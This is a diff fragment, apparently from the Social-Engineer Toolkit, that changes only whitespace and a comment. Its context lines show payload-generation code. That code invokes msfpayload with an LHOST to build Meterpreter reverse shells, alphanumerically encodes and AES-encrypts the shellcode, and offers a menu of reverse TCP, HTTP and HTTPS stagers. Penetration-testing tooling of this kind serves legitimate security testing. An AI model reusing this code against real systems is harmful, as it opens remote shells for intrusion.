@@ -387,6 +387,7 @@ try:
                         print_status("Generating the payload via msfpayload and generating alphanumeric shellcode...")
                         subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/meterpreter.raw" % (path,choice9,choice2,portnum,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/meterpreter.raw -t raw BufferRegister=EAX > %s/meterpreter.alpha_decoded" % (path,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+
                     if choice1 == "shellcode/pyinject" or choice1 == "shellcode/multipyinject":
                     # define, this will eventually be all of our payloads
                         multipyinject_payload = ""
@@ -394,6 +395,8 @@ try:
                         if os.path.isfile("%s/meta_config_multipyinjector" % (setdir)):
                             os.remove("%s/meta_config_multipyinjector" % (setdir))
                         while 1:
+                        
+                        
                             if choice1 == "shellcode/multipyinject":
                                 print ("\nSelect the payload you want to deliver via shellcode injection\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n   4) Windows Meterpreter (ALL PORTS) Reverse TCP\n   5) Windows Reverse Command Shell\n   6) I'm finished adding payloads.\n")
                                 choice9 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
@@ -454,14 +457,14 @@ try:
                             # break out of the loop if we are only using one payload else keep on
                             if choice1 == "shellcode/pyinject": break
                             multipyinject_payload += shellcode + ","
-
+                        
                         # get rid of tail comma
                         if multipyinject_payload.endswith(","):
                             multipyinject_payload = multipyinject_payload[:-1]
+
                         # if we have multiple payloads, use multi injector
                         if choice1 == "shellcode/multipyinject":
                             # we first need to encrypt the payload via AES 256
-                            # def encryptAES(secret, data):
                             print_status("Encrypting the shellcode via 256 AES encryption..")
                             secret = os.urandom(32)
                             shellcode = encryptAES(secret, multipyinject_payload)
